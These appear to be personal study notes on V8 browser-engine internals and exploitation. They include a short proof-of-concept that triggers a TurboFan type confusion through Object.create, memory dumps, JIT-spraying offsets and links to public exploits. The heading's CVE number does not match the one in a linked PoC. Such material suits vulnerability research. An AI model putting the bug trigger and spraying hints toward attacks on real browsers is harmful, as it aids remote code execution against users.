# CVE-2018-17643

`V(CreateObject, Operator::kNoWrite, 1, 1)` indicates CreateObject operation will not have any observable side effects. However, certain operations CAN have obseraveble side effects (e.g. if map has been changed). If these operations that have an obserable side effect are not correctly identified, then they may be removed during the various optimisation phases (such as redundancy elimination).

### Overview

Basically the vulnerability lies in the fact that the kNoWrite flag indicates that the CreateObject operation will not have observable side effects, or in other words, observable changes to the execution of the context. Object.create(obj) causes map of object to change from FastProperties to DictionaryProperties. If we can remove CheckMap, then we can trigger a type confusion.

```
function vuln(obj) {
  obj.a;
  Object.create(obj)
  return obj.b;
}

d8> vuln({a:42, b:43})
43
d8> vuln({a:42, b:43})
43
d8> %OptimizeFunctionOnNextCall(vuln)
undefined
d8> vuln({a:42, b:43})
0
```

- At the point of type confusion, the engine still thinks that the object's properties is FastProperties and hence tries to access the value inline when the properties has already map transitioned into DictionaryProperties, hence 0 is returned (view in memory is better).


### Obtaining buggy source code

```
git checkout 568979f4d891bafec875fab20f608ff9392f4f29
```

### Memory analysis of Fast Properties vs Slow Properties (no bug)

```
let obj = {a:42};
obj.b = 43;

DebugPrint: 000000A155A8DAA9: [JS_OBJECT_TYPE]
 - map: 0x02447288c251 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x01c865e84229 <Object map = 00000244728822F1>
 - elements: 0x00de84002cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x00a155a8db51 <PropertyArray[3]> {
    #a: 42 (data field 0)
    #b: 43 (data field 1) properties[0]
 }

0:000> dq 000000A155A8DAA9-1
000000a1`55a8daa8  00000244`7288c251 | 000000a1`55a8db51 | <- backing store
000000a1`55a8dab8  000000de`84002cf1 0000002a`00000000
000000a1`55a8dac8  000000de`84002341 00000005`00000000
000000a1`55a8dad8  00000001`00000000 000000de`840046f9
000000a1`55a8dae8  000001c8`65ea2049 00000140`00000000
000000a1`55a8daf8  00000001`00000000 000000de`84002341
000000a1`55a8db08  00000008`00000000 00000002`00000000
000000a1`55a8db18  000000de`840046f9 000001c8`65ea2049

0:000> dq 0x00a155a8db51-1
000000a1`55a8db50  000000de`84003899 00000003`00000000
000000a1`55a8db60  0000002b`00000000 000000de`840025a1
000000a1`55a8db70  000000de`840025a1 deadbeed`beadbeef
000000a1`55a8db80  deadbeed`beadbeef deadbeed`beadbeef
000000a1`55a8db90  deadbeed`beadbeef deadbeed`beadbeef
000000a1`55a8dba0  deadbeed`beadbeef deadbeed`beadbeef
000000a1`55a8dbb0  deadbeed`beadbeef deadbeed`beadbeef
000000a1`55a8dbc0  deadbeed`beadbeef deadbeed`beadbeef
```

```
// After map transition via Object.create()

DebugPrint: 000000A155A8DAA9: [JS_OBJECT_TYPE]
 - map: 0x02447288c2f1 <Map(HOLEY_ELEMENTS)> [DictionaryProperties]
 - prototype: 0x01c865e84229 <Object map = 00000244728822F1>
 - elements: 0x00de84002cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x00a155a8db79 <NameDictionary[29]> {
   #b: 43 (data, dict_index: 2, attrs: [WEC])
   #a: 42 (data, dict_index: 1, attrs: [WEC])
 }
```

### To do

Sandbox Escape via AppCache: [Video](https://www.youtube.com/watch?v=MMxtKq8UgwE&ab_channel=OffensiveCon), [Gpz Report](https://bugs.chromium.org/p/chromium/issues/detail?id=888926), [Exploit](https://github.com/niklasb/hack2win-chrome)

### JIT Spraying (R-X)

On earlier versions of Chrome, JIT functions are marked as RWX spaces. For this version of d8 and chrome, JIT-ed functions are marked as R-X. But still technically exploitable via JIT spraying/shellcoding

```
const foo = () => { return [1.1, 2.2, 3.3]; }
for (let a = 0; a < 100000 ; a+=1) foo();
foo();
%OptimizeFunctionOnNextCall(foo);
foo();
```

![](./how-to-jump-to-code-1.png)

![](./how-to-jump-to-code-2.png)

![](./how-to-jump-to-code-3.png)

Tldr:

- Breakpoint at code pointer + 0x40

- Machine code should be located at code pointer + 0x100

### References

- [Exploit supported by Metasploit](https://www.exploit-db.com/exploits/48184)

- [GPZ Report](https://bugs.chromium.org/p/chromium/issues/detail?id=888923)

- [Exploit write up by Jack Halon](https://jhalon.github.io/chrome-browser-exploitation-3/)

- [JIT Shellcoding PoC](https://github.com/kdmarti2/CVE-2018-17463)

- [JIT Shellcoding to escape Cage](https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html)

### Others

[Chrome Browser Exploitation 1 by Jack Halon](https://jhalon.github.io/chrome-browser-exploitation-1/)

[Chrome Browser Exploitation 2 by Jack Halon](https://jhalon.github.io/chrome-browser-exploitation-2/)

[Chrome Browser Exploitation 3 by Jack Halon](https://jhalon.github.io/chrome-browser-exploitation-3/)

# JavaScript Engines: The Good Partsâ„¢ - Mathias Bynens & Benedikt Meurer - JSConf EU 2018

[YouTube Link](https://www.youtube.com/watch?v=5nmpokoRaZI)

[Slides/Notes](https://mathiasbynens.be/notes/shapes-ics)

JavaScript Code -> Parser -> AST -> Interpreter -> ByteCode -> Execution by Engine

ByteCode -> Compiler - > Non-Optimized Code

Non-Optimized Code -> Optimizer -> Optimize Code

Optimized Code -> Deoptimizer -> Non-Optimized Code

V8 has one optimizer

Spider Monkey and Chakra has two

JSC has three 

```
object = {
    x: 1,
    y: 1
}
```

```
Object
'x' : pointers to property attribute 1
'y' : pointers to property attribute 1
```

```
array = [1, 2]
```

```
Array
length -> 2
'0' -> 1
'1' -> 2
```

Need to make property access fast and efficient via using the concepts of "shapes"/"maps"/"hidden classes"/"types"/"structure" (differs based on the JavaScript engine itself).

In general, javascript objects are defined with the same properties and functions operating on these objects also tend to access the same property that have the same shape. Optimize propety access based on shapes.

When we create an object like obj1 = { x:5, y:6 } and when we access the x attribute, JavaScript needs to find the object, find the x property, find the property attribute to x and eventually retrieve the value 5. All of these are stored in memory. If we create another obj2 = { x:5, y:6 }, then we need to create another set of those data structures in memory which is wasteful, if not for the concept of shapes.

```
Object
5
6
|
v
Shape
'x' : pointers to property information offset 0
'y' : pointers to property information offset 1
```

What is we add a property to the object? What happens to the shapt it is associated to? The shape goes through a process called shape transition (create another shape with just new property to prevent the wastage of space). The object will point to the new shape. There is a doubly linked chain between the new shape and the original shape.

```
obj1 = {}
obj1.x = 5 // creates 2 shapes
obj2 = { x:5 } // create an additional NEW shape even though obj2 shape is the "same" as obj1 shape as obj1 current shape is linked to the root empty shape while obj2's shape itself is the root shape
```

Inline Cache: a way to optimize property access. "Memorize" shape so that you do not need to access property information to get the value for the property access

```
array = ["hehe", "lolol"]

Elements (writeable, enumerable, configurable)
"hehe"
"lolol"
^
|
Array
2
|
v
Shape
'length' : pointers to property information offset 0
```

```
array = Object.defineProperty([], '0', { ... }) // this way is super inefficient cause it creates another dictionary of pointers
array = Object.defineProperty([], '1', { ... })

Dictionary Elements
0: pointer to property attributes 'hehe'
1: pointer to property attributes 'lolol'
^
|
Array
1
|
v
Shape
'length' : pointers to property information offset 0
```

Summary of pipeline components for V8:

1. Ignition (interpreter): code to bytecode

2. Sparkplug: bytecode to non-optimized code

3. TurboFan: non-optimized code to optimized code

# V8 Object Internals (play around with V8)

```
d8> var obj1 = { x:0x41, y:0x42, z: "w00tw00t" }
undefined
d8> %DebugPrint(obj1)
DebugPrint: 00000267D00102E1: [JS_OBJECT_TYPE]
 - map: 0x01bd8050c2a1 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x01156e304229 <Object map = 000001BD805022F1>
 - elements: 0x028287d82cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x028287d82cf1 <FixedArray[0]> {
    #x: 66 (data field 0)
    #y: 65 (data field 1)
    #z: 0x01156e325e51 <String[8]: w00tw00t> (data field 2)
 }
000001BD8050C2A1: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 48
 - inobject properties: 3
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: 3
 - stable_map
 - back pointer: 0x01bd8050c251 <Map(HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x02bcb0a82201 <Cell value= 1>
 - instance descriptors (own) #3: 0x0267d000d939 <DescriptorArray[11]>
 - layout descriptor: 0000000000000000
 - prototype: 0x01156e304229 <Object map = 000001BD805022F1>
 - constructor: 0x01156e304261 <JSFunction Object (sfi = 000002BCB0A8ED51)>
 - dependent code: 0x028287d82391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

{x: 66, y: 65, z: "w00tw00t"}
```

```
0:001> dqs 00000267D0014961-1
00000267`d0014960  000001bd`8050c2a1
00000267`d0014968  00000282`87d82cf1
00000267`d0014970  00000282`87d82cf1
00000267`d0014978  00000041`00000000
00000267`d0014980  00000042`00000000
00000267`d0014988  00000115`6e325e51
00000267`d0014990  00000282`87d829c1
00000267`d0014998  00000014`ac819412
00000267`d00149a0  72506775`62654425
00000267`d00149a8  5f6a626f`28746e69
00000267`d00149b0  deadbeed`2977656e
00000267`d00149b8  00000282`87d823a1
00000267`d00149c0  00000001`00000000
00000267`d00149c8  00000115`6e328ddb
00000267`d00149d0  00000282`87d828d1
00000267`d00149d8  00000004`00000000
0:001> dc 00000115`6e325e51-1
00000115`6e325e50  87d82531 00000282 044c686e 00000008  1%......nhL.....
00000115`6e325e60  74303077 74303077 87d82a61 00000282  w00tw00ta*......
00000115`6e325e70  6e325fb1 00000115 6e325ea1 00000115  ._2n.....^2n....
00000115`6e325e80  6e326011 00000115 6e325dd1 00000115  .`2n.....]2n....
00000115`6e325e90  00000053 00000000 0000ff0a 84000800  S...............
00000115`6e325ea0  87d82a11 00000282 00000000 00000007  .*..............
00000115`6e325eb0  00000000 00000c43 00000000 00000000  ....C...........
00000115`6e325ec0  00000000 00000000 87d82821 00000282  ........!(......
```

# Object Representation (Deep into V8)

```
Object
Map: pointer to HiddenClass/Shape
Properties: named properties
Elements: numbered properties (for arrays as well)
Inline Object Properties
```

When you create an object, you create a map, we will call it OriginalMap.

When you add a property to the object, OriginalMap will transition to NewMap1 and the object will reference NewMap1 while OriginalMap still "exists" in memory.

In terms of "stability" which is relevant for the later CVEs, the first map we create will always be stable. If a map goes through a transition, the new map will always be a stable map while the old map that was transited from will be unstable.

What if we delete a property? If the last property added was deleted, then we can just transit back to the previous map. If we delete a middle property, then we give up maintaining the transition tree and switch to dictionary/slow properties

Moving on the Elements, there are 3 distinct types for V8: SMI_ELEMENTS, DOUBLE_ELEMENTS, and ELEMENTS. There are also 2 different ways arrays are stored: PACKED and HOLEY. See the transition lattice for elements on the Jack Halon blog.

There are an additional 2 optimisations done: Pointer Tagging and Pointer Compression

Pointer Tagging used to differentiate object pointers (new Number()) from SMI/Integers stored inline. 

In pointer tagging, only half the pointer points to the object in memory, which is a second optimization known as pointer compression. The other half stored in root register.

# Chrome Architecture

Browser Process: Manager

Renderer Process: Content

Communication between Browser and Renderer: IPC/Mojo

Isolate: Virtual Machine which runs JavaScript

Context: Holds state of VM

Ignition: JSC -> JSBC -> JSVM Execution (skipped internals, relevant maybe for [CVE-2021-30517](https://github.blog/2022-06-29-the-chromium-super-inline-cache-type-confusion/))

SparkPlug: JSBC -> Non-optimized MC -> Native Execution (skipped, relevant maybe for [Issue-1179595](https://bugs.chromium.org/p/chromium/issues/detail?id=1179595))

TurboFan: Non-optimized MC -> Optimized MC -> Native Execution

# TurboFan Optimizations

1. Typer

2. Range Analysis

3. Bounds Checking Elimination (now disabled cause abused too much)

4. Redundancy Elimination

5. Control Optimization

6. Alias Analysis & Global Value Numbering

7. Dead Code Elimination

# WASM

WebAssembly is essentially a low level programming language which allows other programming languages (rust/c++) to execute in web browsers

Compile these languages into WebAssembly binary and implant it into your HTML/JS files.

There is also WebAssembly Text (WAT) which can represent Web Assembly in assembly-like code and be compiled into a WebAssembly binary

Look at [WASM in 100 seconds](https://www.youtube.com/watch?v=cbB3QEwWMlA&ab_channel=Fireship) or [What is WASM?](https://www.youtube.com/watch?v=jGKjKx2vous&ab_channel=codedamn) to see how C++ code is "used" in HTML/JS.

WebAssembly binaries can access the same web API that are available to JavaScript

Liftoff compiles WebAssembly code to native machine code (similar to Sparkplug). WASM is also JIT-compiled hence its memory pages are marked with RWX permissions. There is an associated write-protect-flag for wasm but it is disabled by default.

In WebAssembly, a compiled piece of code is known as a module. These modules are then instantiated to produce an executable object called an instance. An instance is an object that contain all of the exported WebAssembly functions which allow calling into WebAssembly code from JavaScript. In the V8 engine, these objects are known as the WasmModuleObject and WasmInstanceObject respectively.

WebAssembly is similar to a Portable Executable (PE) file containing sections, of which there are about 11 standard sections in a WebAssembly module